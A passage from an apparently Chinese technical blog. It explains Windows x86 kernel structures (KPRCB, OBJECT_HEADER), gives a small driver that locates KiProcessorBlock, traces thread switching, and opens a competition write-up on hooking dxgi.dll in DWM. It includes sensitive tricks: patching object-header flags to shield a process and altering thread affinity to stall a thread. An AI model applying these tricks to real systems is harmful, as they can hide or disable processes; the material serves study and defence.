class=\"comment\">//0x3390</span></span><br><span class=\"line\">    ULONGLONG RuntimeAccumulation;                                          <span class=\"comment\">//0x3398</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_PROCESSOR_POWER_STATE</span> PowerState;                               <span class=\"comment\">//0x33a0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KDPC</span> DpcWatchdogDpc;                                            <span class=\"comment\">//0x3468</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KTIMER</span> DpcWatchdogTimer;                                        <span class=\"comment\">//0x3488</span></span><br><span class=\"line\">    VOID* WheaInfo;                                                         <span class=\"comment\">//0x34b0</span></span><br><span class=\"line\">    VOID* EtwSupport;                                                       <span class=\"comment\">//0x34b4</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_SLIST_HEADER</span> InterruptObjectPool;                                <span class=\"comment\">//0x34b8</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_SLIST_HEADER</span> HypercallPageList;                                  <span class=\"comment\">//0x34c0</span></span><br><span class=\"line\">    VOID* HypercallPageVirtual;                                             <span class=\"comment\">//0x34c8</span></span><br><span class=\"line\">    VOID* VirtualApicAssist;                                                <span class=\"comment\">//0x34cc</span></span><br><span class=\"line\">    ULONGLONG* StatisticsPage;                                              <span class=\"comment\">//0x34d0</span></span><br><span class=\"line\">    VOID* RateControl;                                                      <span class=\"comment\">//0x34d4</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_CACHE_DESCRIPTOR</span> Cache[<span class=\"number\">5</span>];                                      <span class=\"comment\">//0x34d8</span></span><br><span class=\"line\">    ULONG CacheCount;                                                       <span class=\"comment\">//0x3514</span></span><br><span class=\"line\">    ULONG CacheProcessorMask[<span class=\"number\">5</span>];                                            <span class=\"comment\">//0x3518</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KAFFINITY_EX</span> PackageProcessorSet;                               <span class=\"comment\">//0x352c</span></span><br><span class=\"line\">    ULONG PrcbPad91[<span class=\"number\">1</span>];                                                     <span class=\"comment\">//0x3538</span></span><br><span class=\"line\">    ULONG CoreProcessorSet;                                                 <span class=\"comment\">//0x353c</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KDPC</span> TimerExpirationDpc;                                        <span class=\"comment\">//0x3540</span></span><br><span class=\"line\">    ULONG SpinLockAcquireCount;                                             <span class=\"comment\">//0x3560</span></span><br><span class=\"line\">    ULONG SpinLockContentionCount;                                          <span class=\"comment\">//0x3564</span></span><br><span class=\"line\">    ULONG SpinLockSpinCount;                                                <span class=\"comment\">//0x3568</span></span><br><span class=\"line\">    ULONG IpiSendRequestBroadcastCount;                                     <span class=\"comment\">//0x356c</span></span><br><span class=\"line\">    ULONG IpiSendRequestRoutineCount;                                       <span class=\"comment\">//0x3570</span></span><br><span class=\"line\">    ULONG IpiSendSoftwareInterruptCount;                                    <span class=\"comment\">//0x3574</span></span><br><span class=\"line\">    ULONG ExInitializeResourceCount;                                        <span class=\"comment\">//0x3578</span></span><br><span class=\"line\">    ULONG ExReInitializeResourceCount;                                      <span class=\"comment\">//0x357c</span></span><br><span class=\"line\">    ULONG ExDeleteResourceCount;                                            <span class=\"comment\">//0x3580</span></span><br><span class=\"line\">    ULONG ExecutiveResourceAcquiresCount;                                   <span class=\"comment\">//0x3584</span></span><br><span class=\"line\">    ULONG ExecutiveResourceContentionsCount;                                <span class=\"comment\">//0x3588</span></span><br><span class=\"line\">    ULONG ExecutiveResourceReleaseExclusiveCount;                           <span class=\"comment\">//0x358c</span></span><br><span class=\"line\">    ULONG ExecutiveResourceReleaseSharedCount;                              <span class=\"comment\">//0x3590</span></span><br><span class=\"line\">    ULONG ExecutiveResourceConvertsCount;                                   <span class=\"comment\">//0x3594</span></span><br><span class=\"line\">    ULONG ExAcqResExclusiveAttempts;                                        <span class=\"comment\">//0x3598</span></span><br><span class=\"line\">    ULONG ExAcqResExclusiveAcquiresExclusive;                               <span class=\"comment\">//0x359c</span></span><br><span class=\"line\">    ULONG ExAcqResExclusiveAcquiresExclusiveRecursive;                      <span class=\"comment\">//0x35a0</span></span><br><span class=\"line\">    ULONG ExAcqResExclusiveWaits;                                           <span class=\"comment\">//0x35a4</span></span><br><span class=\"line\">    ULONG ExAcqResExclusiveNotAcquires;                                     <span class=\"comment\">//0x35a8</span></span><br><span class=\"line\">    ULONG ExAcqResSharedAttempts;                                           <span class=\"comment\">//0x35ac</span></span><br><span class=\"line\">    ULONG ExAcqResSharedAcquiresExclusive;                                  <span class=\"comment\">//0x35b0</span></span><br><span class=\"line\">    ULONG ExAcqResSharedAcquiresShared;                                     <span class=\"comment\">//0x35b4</span></span><br><span class=\"line\">    ULONG ExAcqResSharedAcquiresSharedRecursive;                            <span class=\"comment\">//0x35b8</span></span><br><span class=\"line\">    ULONG ExAcqResSharedWaits;                                              <span class=\"comment\">//0x35bc</span></span><br><span class=\"line\">    ULONG ExAcqResSharedNotAcquires;                                        <span class=\"comment\">//0x35c0</span></span><br><span class=\"line\">    ULONG ExAcqResSharedStarveExclusiveAttempts;                            <span class=\"comment\">//0x35c4</span></span><br><span class=\"line\">    ULONG ExAcqResSharedStarveExclusiveAcquiresExclusive;                   <span class=\"comment\">//0x35c8</span></span><br><span class=\"line\">    ULONG ExAcqResSharedStarveExclusiveAcquiresShared;                      <span class=\"comment\">//0x35cc</span></span><br><span class=\"line\">    ULONG ExAcqResSharedStarveExclusiveAcquiresSharedRecursive;             <span class=\"comment\">//0x35d0</span></span><br><span class=\"line\">    ULONG ExAcqResSharedStarveExclusiveWaits;                               <span class=\"comment\">//0x35d4</span></span><br><span class=\"line\">    ULONG ExAcqResSharedStarveExclusiveNotAcquires;                         <span class=\"comment\">//0x35d8</span></span><br><span class=\"line\">    ULONG ExAcqResSharedWaitForExclusiveAttempts;                           <span class=\"comment\">//0x35dc</span></span><br><span class=\"line\">    ULONG ExAcqResSharedWaitForExclusiveAcquiresExclusive;                  <span class=\"comment\">//0x35e0</span></span><br><span class=\"line\">    ULONG ExAcqResSharedWaitForExclusiveAcquiresShared;                     <span class=\"comment\">//0x35e4</span></span><br><span class=\"line\">    ULONG ExAcqResSharedWaitForExclusiveAcquiresSharedRecursive;            <span class=\"comment\">//0x35e8</span></span><br><span class=\"line\">    ULONG ExAcqResSharedWaitForExclusiveWaits;                              <span class=\"comment\">//0x35ec</span></span><br><span class=\"line\">    ULONG ExAcqResSharedWaitForExclusiveNotAcquires;                        <span class=\"comment\">//0x35f0</span></span><br><span class=\"line\">    ULONG ExSetResOwnerPointerExclusive;                                    <span class=\"comment\">//0x35f4</span></span><br><span class=\"line\">    ULONG ExSetResOwnerPointerSharedNew;                                    <span class=\"comment\">//0x35f8</span></span><br><span class=\"line\">    ULONG ExSetResOwnerPointerSharedOld;                                    <span class=\"comment\">//0x35fc</span></span><br><span class=\"line\">    ULONG ExTryToAcqExclusiveAttempts;                                      <span class=\"comment\">//0x3600</span></span><br><span class=\"line\">    ULONG ExTryToAcqExclusiveAcquires;                                      <span class=\"comment\">//0x3604</span></span><br><span class=\"line\">    ULONG ExBoostExclusiveOwner;                                            <span class=\"comment\">//0x3608</span></span><br><span class=\"line\">    ULONG ExBoostSharedOwners;                                              <span class=\"comment\">//0x360c</span></span><br><span class=\"line\">    ULONG ExEtwSynchTrackingNotificationsCount;                             <span class=\"comment\">//0x3610</span></span><br><span class=\"line\">    ULONG ExEtwSynchTrackingNotificationsAccountedCount;                    <span class=\"comment\">//0x3614</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_CONTEXT</span>* Context;                                               <span class=\"comment\">//0x3618</span></span><br><span class=\"line\">    ULONG ContextFlags;                                                     <span class=\"comment\">//0x361c</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_XSAVE_AREA</span>* ExtendedState;                                      <span class=\"comment\">//0x3620</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>CurrentThread：当前CPU正在跑的线程。</li>\n<li>NextThread：将要切换的线程。</li>\n<li>IdleThread：如果没有要切换的线程，CPU将要跑的空闲线程。</li>\n<li>DispatcherReadyListHead：线程就绪位，共32位，哪一位为1说明哪一个核上有线程在跑。</li>\n</ul>\n<h2 id=\"3-2-代码获取KiProcessorBlock\"><a href=\"#3-2-代码获取KiProcessorBlock\" class=\"headerlink\" title=\"3.2 代码获取KiProcessorBlock\"></a>3.2 代码获取KiProcessorBlock</h2><p>由于<code>KiProcessorBlock</code>是未公开的变量，因此不能直接使用。但是可以通过上边的<code>KdVersionBlock</code>进行获取。由于只有0核下这个成员才有值，因此需要将当前的运行线程切换到0核，可以通过函数<code>KeSetSystemAffinityThread</code>指定当前线程到0核执行。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ntifs.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;intrin.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">DBGKD_GET_VERSION64</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\tUSHORT MajorVersion;                                                    <span class=\"comment\">//0x0</span></span><br><span class=\"line\">\tUSHORT MinorVersion;                                                    <span class=\"comment\">//0x2</span></span><br><span class=\"line\">\tUCHAR ProtocolVersion;                                                  <span class=\"comment\">//0x4</span></span><br><span class=\"line\">\tUCHAR KdSecondaryVersion;                                               <span class=\"comment\">//0x5</span></span><br><span class=\"line\">\tUSHORT Flags;                                                           <span class=\"comment\">//0x6</span></span><br><span class=\"line\">\tUSHORT MachineType;                                                     <span class=\"comment\">//0x8</span></span><br><span class=\"line\">\tUCHAR MaxPacketType;                                                    <span class=\"comment\">//0xa</span></span><br><span class=\"line\">\tUCHAR MaxStateChange;                                                   <span class=\"comment\">//0xb</span></span><br><span class=\"line\">\tUCHAR MaxManipulate;                                                    <span class=\"comment\">//0xc</span></span><br><span class=\"line\">\tUCHAR Simulation;                                                       <span class=\"comment\">//0xd</span></span><br><span class=\"line\">\tUSHORT Unused[<span class=\"number\">1</span>];                                                       <span class=\"comment\">//0xe</span></span><br><span class=\"line\">\tULONGLONG KernBase;                                                     <span class=\"comment\">//0x10</span></span><br><span class=\"line\">\tULONGLONG PsLoadedModuleList;                                           <span class=\"comment\">//0x18</span></span><br><span class=\"line\">\tULONGLONG DebuggerDataList;                                             <span class=\"comment\">//0x20</span></span><br><span class=\"line\">&#125;DBGKD_GET_VERSION64, *PDBGKD_GET_VERSION64;</span><br><span class=\"line\"></span><br><span class=\"line\">VOID <span class=\"title function_\">unloaddrv</span><span class=\"params\">(PDRIVER_OBJECT pDrv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS <span class=\"title function_\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT pDrv,PUNICODE_STRING pReg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tpDrv-&gt;DriverUnload = unloaddrv;</span><br><span class=\"line\"></span><br><span class=\"line\">\tKeSetSystemAffinityThread(<span class=\"number\">0</span>);<span class=\"comment\">//设置到0核</span></span><br><span class=\"line\">\tPKPCR kpcr = (PKPCR)__readfsdword(<span class=\"number\">0x1C</span>); <span class=\"comment\">//SelfPcr</span></span><br><span class=\"line\">\tPDBGKD_GET_VERSION64 pdbgVer = (PDBGKD_GET_VERSION64)kpcr-&gt;KdVersionBlock;</span><br><span class=\"line\">\tULONG_PTR DbgDataList = *(PULONG_PTR)(pdbgVer-&gt;DebuggerDataList);</span><br><span class=\"line\">\tDbgPrint(<span class=\"string\">&quot;DbgDataList=%p\\n&quot;</span>, DbgDataList);</span><br><span class=\"line\">\tULONG_PTR KiProcessorBlock = *(PULONG_PTR)(DbgDataList + <span class=\"number\">0x218</span>);   <span class=\"comment\">//KiProcessorBlock - *DebuggerDataList = 0x218</span></span><br><span class=\"line\">\tDbgPrint(<span class=\"string\">&quot;KiProcessorBlock=%p\\n&quot;</span>, KiProcessorBlock);</span><br><span class=\"line\">\tKeRevertToUserAffinityThread();<span class=\"comment\">//恢复</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614014234470.png\" alt=\"image-20230614014234470\"></p>\n<h1 id=\"4、OBJECT-HEADER\"><a href=\"#4、OBJECT-HEADER\" class=\"headerlink\" title=\"4、OBJECT_HEADER\"></a>4、OBJECT_HEADER</h1><p>每一个对象都有一个对象头，然后接着才是对象类型的结构内容。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230613130813145.png\" alt=\"image-20230613130813145\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x20 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_OBJECT_HEADER</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    LONG PointerCount;                                                      <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        LONG HandleCount;                                                   <span class=\"comment\">//0x4</span></span><br><span class=\"line\">        VOID* NextToFree;                                                   <span class=\"comment\">//0x4</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_EX_PUSH_LOCK</span> Lock;                                              <span class=\"comment\">//0x8</span></span><br><span class=\"line\">    UCHAR TypeIndex;                                                        <span class=\"comment\">//0xc</span></span><br><span class=\"line\">    UCHAR TraceFlags;                                                       <span class=\"comment\">//0xd</span></span><br><span class=\"line\">    UCHAR InfoMask;                                                         <span class=\"comment\">//0xe</span></span><br><span class=\"line\">    UCHAR Flags;                                                            <span class=\"comment\">//0xf</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_OBJECT_CREATE_INFORMATION</span>* ObjectCreateInfo;                <span class=\"comment\">//0x10</span></span><br><span class=\"line\">        VOID* QuotaBlockCharged;                                            <span class=\"comment\">//0x10</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    VOID* SecurityDescriptor;                                               <span class=\"comment\">//0x14</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_QUAD</span> Body;                                                      <span class=\"comment\">//0x18</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>PointerCount：对应的内核对象被使用了多少次。如调用ObXXXX函数都会将该值+1。该值为0时，对应的内核对象就会被释放。</li>\n<li>HandleCount：句柄引用。</li>\n<li>TypeIndex：对应的内核对象的类型。</li>\n<li>Flags：详细作用未知。当此处的值被置为4时（对应的对象为进程对象时），对应的进程被保护，无法打开、附加。且不影响进程功能。仅对3环起作用。</li>\n<li>Body：接着实际对象类型的结构数据，比如EPROCESS,ETHREAD等等。因此一个对象<code>-0x18</code>可以得到对象头的首地址。</li>\n</ul>\n<h1 id=\"5、Window查询就绪线程函数\"><a href=\"#5、Window查询就绪线程函数\" class=\"headerlink\" title=\"5、Window查询就绪线程函数\"></a>5、Window查询就绪线程函数</h1><p>KPRCB中ReadySummary成员（0x31EC）为就绪位图，4字节32位。每一位对应一条就绪链表。某一位为1则说明对应的就绪链表中有等待执行的线程。32条就绪链表存储在KPRCB中DispatcherReadyListHead成员。如：ReadySummary值为5，二进制0101，说明第0号、第3号就绪链表中存在待执行线程。在线程切换时就会从这两个链表中取待切换的线程。</p>\n<p>Windows中<code>KiFindReadyThread</code>用来查询就绪函数。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230613160832341.png\" alt=\"image-20230613160832341\"></p>\n<p>通过对函数的交叉引用可知前一个参数为ReadySummary后两个都为KPRCB指针。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230613160745296.png\" alt=\"image-20230613160745296\"></p>\n<blockquote>\n<p>bsr从低-&gt;高扫描源操作数第一个为1的位置,下标保存到目的操作数。</p>\n<p>bx &#x3D; 0x10 -&gt; 0001 0000</p>\n<p>bsr ax,bx -&gt; ax &#x3D; 4</p>\n</blockquote>\n<ul>\n<li>没有就绪线程时，CPU会运行一个系统事先准备好的空线程。（Ide）</li>\n<li>线程亲核性决定了线程可以跑在哪个核上。如果恶意修改某个线程结构的亲核性为不存在的核，等同于杀死线程。</li>\n</ul>\n<h1 id=\"6、Windows交换线程函数\"><a href=\"#6、Windows交换线程函数\" class=\"headerlink\" title=\"6、Windows交换线程函数\"></a>6、Windows交换线程函数</h1><p>Windows中有两种线程切换方式，一种是主动切换（WaitForSingleObject、Sleep），另一种是被动切换（CPU时钟）。</p>\n<p>线程状态(来自WKR)：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">ypedef <span class=\"class\"><span class=\"keyword\">enum</span> _<span class=\"title\">KTHREAD_STATE</span> &#123;</span></span><br><span class=\"line\">    Initialized,  \t<span class=\"comment\">//初始化状态</span></span><br><span class=\"line\">    Ready,        \t<span class=\"comment\">//就绪状态，此时线程在就绪链表中等待被取出。</span></span><br><span class=\"line\">    Running,    \t<span class=\"comment\">//运行状态</span></span><br><span class=\"line\">    Standby,    \t<span class=\"comment\">//备用状态，当一个线程被设置到KPRCB的NextThread成员时，为备用状态，线程切换时会直接切换到NextThread中的线程。</span></span><br><span class=\"line\">\tTerminated,     <span class=\"comment\">//结束状态。</span></span><br><span class=\"line\">    Waiting,        <span class=\"comment\">//等待状态。</span></span><br><span class=\"line\">    Transition,     <span class=\"comment\">//交换状态。 当线程优先级很低，执行频率很低时，会被交换到磁盘上。此时为交换状态。内部细分为：正在换出、已经换出、正在换入、已经换入。</span></span><br><span class=\"line\">    DeferredReady, \t<span class=\"comment\">//没用到</span></span><br><span class=\"line\">    GateWait    \t<span class=\"comment\">//没用到</span></span><br><span class=\"line\">&#125; KTHREAD_STATE;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"6-1-主动切换\"><a href=\"#6-1-主动切换\" class=\"headerlink\" title=\"6.1 主动切换\"></a>6.1 主动切换</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">WaitForSingleObject-&gt;NtWaitForSingleObject-&gt;KiCommitThreadWait-&gt;KiSwapThread</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Sleep-&gt;SleepEx-&gt;RtlDelayExecution-&gt;NtDelayExecution-&gt;KiCommitThreadWait-&gt;KiSwapThread</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-1-1-KiSwapThread逆向\"><a href=\"#6-1-1-KiSwapThread逆向\" class=\"headerlink\" title=\"6.1.1 KiSwapThread逆向\"></a>6.1.1 KiSwapThread逆向</h3><p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614114646701.png\" alt=\"image-20230614114646701\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614114706308.png\" alt=\"image-20230614114706308\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614114718633.png\" alt=\"image-20230614114718633\"></p>\n<p><code>KiSwapThread</code>只是做了查询就绪函数，实际上线程交换是在<code>KiSwapContext</code>中</p>\n<h3 id=\"6-1-2-KiSearchForNewThread逆向\"><a href=\"#6-1-2-KiSearchForNewThread逆向\" class=\"headerlink\" title=\"6.1.2 KiSearchForNewThread逆向\"></a>6.1.2 KiSearchForNewThread逆向</h3><p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614114935264.png\" alt=\"image-20230614114935264\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614115004134.png\" alt=\"image-20230614115004134\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614115014216.png\" alt=\"image-20230614115014216\"></p>\n<p><code>KiSearchForNewThread</code>函数主要是对<code>KiSwapThread</code>调用时出入的KPRCB参数进行查找就绪函数，如果当前核找不到则切换到其他核找。</p>\n<h3 id=\"6-1-3-SwapContext逆向\"><a href=\"#6-1-3-SwapContext逆向\" class=\"headerlink\" title=\"6.1.3 SwapContext逆向\"></a>6.1.3 SwapContext逆向</h3><p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614115135812.png\" alt=\"image-20230614115135812\"></p>\n<p>首先将新线程的状态设置为就绪，然后获取新线程的堆栈作为<code>SwapContext_PatchXSave</code>参数调用。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614115229779.png\" alt=\"image-20230614115229779\"></p>\n<p>接着是判断新旧线程是否来自同一个进程。如果是同一个进程则进行切换环境。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614115305076.png\" alt=\"image-20230614115305076\"></p>\n<p>如果不是同一个进程则会切换CR3操作之类的。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614115612425.png\" alt=\"image-20230614115612425\"></p>\n<blockquote>\n<p>1、用户层绝大部分API的调用都会导致线程的切换</p>\n<p>2、本质上没有进程切换，只是在线程切换时如果不是同一进程则会顺带CR3进行处理。</p>\n</blockquote>\n<h2 id=\"6-2-被动切换\"><a href=\"#6-2-被动切换\" class=\"headerlink\" title=\"6.2 被动切换\"></a>6.2 被动切换</h2><p>被动切换实际上是CPU时钟切换，windbg使用<code>!idt</code>中断表，其中有一项名为<code>hal!HalpHpetClockInterrupt</code>。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614120241008.png\" alt=\"image-20230614120241008\"></p>\n<p>可以看到属于hal模块，因为CPU操作属于硬件操作。hal负责与硬件进行操作。Windows系统对于不同的处理器提供了不同的hal模块。在Windbg中输入命令<code>lm</code>查看当前Windows使用的hal模块全名称。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614120410056.png\" alt=\"image-20230614120410056\"></p>\n<p>ida打开后跳转到<code>HalpHpetClockInterrupt</code>.</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614120813868.png\" alt=\"image-20230614120813868\"></p>\n<p>简单分析后实际上有用的也就<code>KeUpdateSystemTime</code>函数，进入查看。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614120850794.png\" alt=\"image-20230614120850794\"></p>\n<p>发现来自导入表。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614120909664.png\" alt=\"image-20230614120909664\"></p>\n<p>回到ntotkrnl查看该函数。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614120949595.png\" alt=\"image-20230614120949595\"></p>\n<p>函数很长，实际上有用的是最后的返回函数。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614121210212.png\" alt=\"image-20230614121210212\"></p>\n<p>继续回到hal查看<code>HalRequestSoftwareInterrupt</code></p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614121501799.png\" alt=\"image-20230614121501799\"></p>\n<p>进入<code>KfLowerIrql</code>.</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614121554962.png\" alt=\"image-20230614121554962\"></p>\n<p>进入<code>HalpCheckForSoftwareInterrupt</code>.</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614121614349.png\" alt=\"image-20230614121614349\"></p>\n<p>进入<code>HalpDispatchSoftwareInterrupt</code></p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614121631225.png\" alt=\"image-20230614121631225\"></p>\n<p>回到ntoskrnl进入<code>KiDispatchInterrupt</code>.</p>\n<p><img src=\"/../images/Window-Kernel/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/image-20230614121711042.png\" alt=\"image-20230614121711042\"></p>\n<p>CPU时钟的调用流程如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hal!HalpHpetClockInterrupt</span><br><span class=\"line\">nt!KeUpdateSystemTime</span><br><span class=\"line\">nt!KeUpdateRunTime</span><br><span class=\"line\">hal!HalRequestSoftwareInterrupt</span><br><span class=\"line\">hal!KfLowerIrql</span><br><span class=\"line\">hal!HalpCheckForSoftwareInterrupt</span><br><span class=\"line\">hal!HalpDispatchSoftwareInterrupt</span><br><span class=\"line\">nt!KiDispatchInterrupt</span><br><span class=\"line\">SwapContext</span><br></pre></td></tr></table></figure>\n\n<p>只是简单跟了一下~~~~。</p>\n<blockquote>\n<p>另外，当软件发生异常的时候（实际上就是中断），就会进行线程切换。因此，在Windows操作系统中，调用绝大部分API 以及 触发各种异常 均会导致线程的切换。如果想让自己的线程永远占有CPU，则不可以调用API、不能触发异常（内存访问也可能触发缺页异常，在用户层是看不出来的）。</p>\n</blockquote>\n","categories":["Windows-Kernel"]},{"title":"2022游戏安全技术竞赛-决赛","url":"/2024/04/21/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/","content":"<ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2022-4-29 15:59</li>\n</ul>\n<h1 id=\"运行效果\"><a href=\"#运行效果\" class=\"headerlink\" title=\"运行效果\"></a>运行效果</h1><p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>原程序运行后显示ACE，并且许秒后绘制消失。原题则要求如下：</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>程序分为SYS与EXE，EXE中只有一个与驱动通讯，即运行后让驱动执行绘制。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>因此着重分析SYS。</p>\n<h1 id=\"详细分析\"><a href=\"#详细分析\" class=\"headerlink\" title=\"详细分析\"></a>详细分析</h1><p>很明显将初赛的部分代码通过驱动来写。首先是获取DWM的EPROCESS。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>然后获取D3DCompile函数地址用作后面修复，获取dxgi.dll后面用作HOOK。</p>\n<p><img src=\"/../images/Reverse/2022%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-%E5%86%B3%E8%B5%9B/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>紧接着开始在dxgi.dll中搜索特征码48 8B C4 55 